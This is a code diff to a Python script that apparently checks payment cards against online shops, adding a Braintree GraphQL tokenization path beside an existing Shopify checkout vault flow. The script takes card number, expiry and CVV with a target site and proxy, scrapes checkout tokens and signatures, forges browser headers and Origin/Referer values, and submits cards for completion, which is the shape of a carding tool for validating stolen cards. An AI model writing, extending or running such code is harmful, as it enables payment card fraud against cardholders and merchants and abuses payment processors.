@@ -495,6 +495,47 @@ def extract_clean_response(message):
             return first_word
     return message[:50]
 
+async def _braintree_tokenize(session, cc, mes, ano, cvv, client_token, proxy):
+    """Tokenize a card via Braintree GraphQL API and return payment nonce/id."""
+    year = int(ano)
+    if year < 100:
+        year += 2000
+    query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
+        tokenizeCreditCard(input: $input) {
+            paymentMethod { id legacyId }
+        }
+    }"""
+    variables = {
+        "input": {
+            "creditCard": {
+                "number": cc,
+                "expirationMonth": str(mes).zfill(2),
+                "expirationYear": str(year),
+                "cvv": cvv
+            }
+        }
+    }
+    headers = {
+        'Authorization': f'Bearer {client_token}',
+        'Braintree-Version': '2018-05-10',
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+        'Origin': 'https://assets.braintreegateway.com',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    }
+    try:
+        async with session.post(
+            'https://payments.braintree-api.com/graphql',
+            json={'query': query, 'variables': variables},
+            headers=headers, proxy=proxy,
+            timeout=aiohttp.ClientTimeout(total=15)
+        ) as resp:
+            data = await resp.json(content_type=None)
+            pm = data.get('data', {}).get('tokenizeCreditCard', {}).get('paymentMethod', {})
+            return pm.get('id') or pm.get('legacyId')
+    except Exception:
+        return None
+
 # =========== CORE PAYMENT PROCESSOR ===============
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
     gateway = "UNKNOWN"
@@ -611,6 +652,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped_text)
             if ident_match:
                 ident_sig = ident_match.group(1)
+            braintree_client_token = (
+                extract_between(text, 'data-braintree-client-authorization="', '"') or
+                extract_between(unescaped_text, '"clientAuthorization":"', '"') or
+                extract_between(text, 'clientAuthorization&quot;:&quot;', '&quot;') or
+                extract_between(unescaped_text, '"authorization":"', '"')
+            )
             if not sst:
                 return False, "Failed to get session token", gateway, total_price, currency
             headers.update({
@@ -861,42 +908,50 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             ano_int = int(ano)
             if ano_int < 100:
                 ano_int += 2000
-            payload = {
-                "credit_card": {
-                    "number": cc, "month": int(mes), "year": ano_int,
-                    "verification_value": cvv, "start_month": None, "start_year": None,
-                    "issue_number": "", "name": f"{firstName} {lastName}"
-                },
-                "payment_session_scope": urlparse(url).netloc
-            }
-            vault_headers = {
-                'Content-Type': 'application/json', 'Accept': 'application/json',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Origin': 'https://checkout.pci.shopifyinc.com',
-                'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-origin', 'sec-fetch-storage-access': 'active',
-            }
-            if ident_sig:
-                vault_headers['shopify-identification-signature'] = ident_sig
-            vault_timeout = aiohttp.ClientTimeout(total=TIMEOUT_VAULT, connect=7)
             token = None
-            for v_attempt in range(3):
-                try:
-                    response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=vault_timeout)
-                    if response.status == 200:
-                        token_data = await response.json()
-                        token = token_data.get('id')
-                        if token:
-                            break
-                except Exception:
-                    pass
-                await asyncio.sleep(0.1)
-            if not token:
-                return False, 'Unable to get payment token (Vault Error)', gateway, total_price, currency
+            is_braintree = bool(braintree_client_token) or 'braintree' in str(payment_identifier).lower() or 'paypal' in str(payment_identifier).lower()
+            if is_braintree and braintree_client_token:
+                # PayPal / Braintree gateway — tokenize via Braintree API
+                token = await _braintree_tokenize(session, cc, mes, ano, cvv, braintree_client_token, proxy)
+                if not token:
+                    return False, 'Braintree tokenization failed', gateway, total_price, currency
+            else:
+                # Shopify Payments — vault via Shopify PCI
+                payload = {
+                    "credit_card": {
+                        "number": cc, "month": int(mes), "year": ano_int,
+                        "verification_value": cvv, "start_month": None, "start_year": None,
+                        "issue_number": "", "name": f"{firstName} {lastName}"
+                    },
+                    "payment_session_scope": urlparse(url).netloc
+                }
+                vault_headers = {
+                    'Content-Type': 'application/json', 'Accept': 'application/json',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Origin': 'https://checkout.pci.shopifyinc.com',
+                    'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+                    'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+                    'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin', 'sec-fetch-storage-access': 'active',
+                }
+                if ident_sig:
+                    vault_headers['shopify-identification-signature'] = ident_sig
+                vault_timeout = aiohttp.ClientTimeout(total=TIMEOUT_VAULT, connect=7)
+                for v_attempt in range(3):
+                    try:
+                        response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy, timeout=vault_timeout)
+                        if response.status == 200:
+                            token_data = await response.json()
+                            token = token_data.get('id')
+                            if token:
+                                break
+                    except Exception:
+                        pass
+                    await asyncio.sleep(0.1)
+                if not token:
+                    return False, 'Unable to get payment token (Vault Error)', gateway, total_price, currency
             params = {'operationName': 'SubmitForCompletion'}
             submit_variables = {
                 'input': {
